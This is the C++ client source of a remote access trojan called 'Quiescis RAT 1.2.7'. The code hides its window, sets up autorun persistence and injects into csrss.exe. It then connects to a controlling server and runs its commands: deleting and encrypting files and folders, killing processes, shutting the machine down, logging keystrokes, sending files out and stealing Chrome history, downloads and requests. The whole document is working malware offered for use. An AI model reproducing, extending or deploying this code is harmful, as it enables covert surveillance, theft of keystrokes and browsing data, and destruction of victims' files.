/*
 * Quiescis Remote Access Trojan 1.2.7
 * WARNING!
 * This software is the full property of the author
 * Not intended for dumb kids
 * Copyright (c) 2020 by Nikait
 *
 * client part
*/


#include <winsock2.h>
#include <fstream>
#include <string>

#include "Config.h"

#if autorun
	#include "Autorun.h"
#endif // autorun

#include "Socket.h"
#include "Crypt.h"
#include "Utils.h"
#include "Info.h"
#include "Keylogger.h"
#if chrome_stealer
	#include "Chrome.h"
#endif // chrome_stealer

std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;

int Shell(SOCKADDR_IN addr);

int main() {
	// hide console
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	setlocale(LC_ALL, lang);
	// autorun
#if autorun
	RegisterProgram();
	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);

	HINSTANCE hKernel;

	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
	if (hKernel) {
		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
			GetProcAddress(hKernel, "RegisterServiceProcess");
	}

#endif // end autorun
	// server configuration start
	SOCKADDR_IN add = Server();
	// start kurva
	Shell(add);
	return 0;
}

int Shell(SOCKADDR_IN addr) {
	char path[2048];
	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		return 1;
	}
	char buffer[256];
	while (true) {
		// deliting the temp file for commands
		std::ifstream tmp_f("file.txt");
		if (tmp_f.is_open()) {
			tmp_f.close();
			system("del file.txt");
		}

		// clear varibales
		buf_file = "";
		loc_buf_file = "";
		memset(&buffer, 0x0, sizeof(buffer));

		recv(conn, buffer, sizeof(buffer), NULL);
		memset(&path, 0x0, sizeof(path));

		if (strcmp(buffer, "ls") == 0) {
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "dir " + std::string(path) + " > file.txt";
			system(comm.c_str());
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			F.close();
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
		}

		else if (strcmp(buffer, "rm") == 0) {
			recv(conn, path, sizeof(path), NULL);

			n_path = path;
			TreatmentPath(n_path);
			if (n_path[n_path.size() - 1] == '\\') n_path.pop_back();

			if (FilExist(n_path)) {
				std::string comm = "del " + std::string(n_path);
				system(comm.c_str());
				finally_msg = "delete " + std::string(n_path) + " ok";
				if (FilExist(n_path))
					finally_msg = "delete " + std::string(n_path) + " failed\nfile protected";
			} else finally_msg = "delete " + std::string(n_path) + " failed";
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
		}

		else if (strcmp(buffer, "rmdir") == 0) {
			recv(conn, path, sizeof(path), NULL);

			n_path = path;
			TreatmentPath(n_path);

			if (dirExists(n_path)) {
				std::string comm = "RMDIR /S /Q " + std::string(n_path);
				system(comm.c_str());
				finally_msg = "delete " + std::string(path) + " ok";
				if (dirExists(n_path))
					finally_msg = "delete " + std::string(n_path) + " failed\ndirectory protected";
			} else finally_msg = "delete " + std::string(n_path) + " failed";
			
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
		}

		else if (strcmp(buffer, "pwd") == 0) {
			system("echo %cd% > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
			F.close();
		}

		else if (strcmp(buffer, "info") == 0) {
			std::string info = GetAllInfo();
			send(conn, info.c_str(), info.length(), NULL);
		}

		else if (strcmp(buffer, "ps") == 0) {
			system("tasklist > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), buf_file.length(), NULL);
			F.close();
		}

		else if (strcmp(buffer, "kill") == 0) {
			recv(conn, path, sizeof(path), NULL);
			std::string com = "taskkill /T /F /IM " + std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);

		}

		else if (!strcmp(buffer, "shutdown")) {
			system("shutdown /p");
		}

		else if (!strcmp(buffer, "error")) {
			recv(conn, path, sizeof(path), NULL);
			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
		}

		else if (!strcmp(buffer, "keylogger")) {
			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
			recv(conn, path, sizeof(path), NULL);
			while (buf.length() < unsigned int(atoi(path) + 7) && rbuf.length() < unsigned int(atoi(path) + 7)) {
				keylogger(keylog_path);
				buf = readFile(keylog_path + "keylog.txt");
				rbuf = readFile(keylog_path + "keylogru.txt");
			}
			key_ret = "\nen:\n" + buf + "\n\nru:\n" + rbuf;
			keydel = "del " + keylog_path + "keylog.txt";
			rkeydel = "del " + keylog_path + "keylogru.txt";
			system(keydel.c_str());
			system(rkeydel.c_str());
			send(conn, key_ret.c_str(), key_ret.length(), NULL);

			memset(&buf, 0x0, sizeof(buf));
			memset(&rbuf, 0x0, sizeof(rbuf));
		}

		else if (!strcmp(buffer, "cryptfile")) {
			char key[128];
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptFile(path, atoi(key));
			send(conn, res.c_str(), res.length(), NULL);
		}

		else if (!strcmp(buffer, "cryptdir")) {
			char key[128];
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptDir(path, atoi(key));
			send(conn, res.c_str(), res.length(), NULL);
		}

		else if (!strcmp(buffer, "download")) {
			recv(conn, path, sizeof(path), NULL);
			std::ifstream d_file(path);

			if (!d_file.is_open()) send(conn, "exist", 5, NULL);
			else {
				std::string file_data = readFile(path);
				send(conn, file_data.c_str(), file_data.length(), NULL);
				d_file.close();
			}
		}

		else if (!strcmp(buffer, "chrome_st")) {
#if chrome_stealer
			std::string res = GetChromeHistory();
			send(conn, res.c_str(), res.length(), NULL);
			Sleep(1000);
			std::string res_downloads = GetChromeDownloads();
			send(conn, res_downloads.c_str(), res_downloads.length(), NULL);
			Sleep(1000);
			std::string res_requests = GetChromeRequests();
			send(conn, res_requests.c_str(), res_requests.length(), NULL);
#else
		send(conn, "not supported", 13, NULL);
#endif
		}

		else if (strcmp(buffer, "close") == 0) return 1;
	}
	return 0;
}
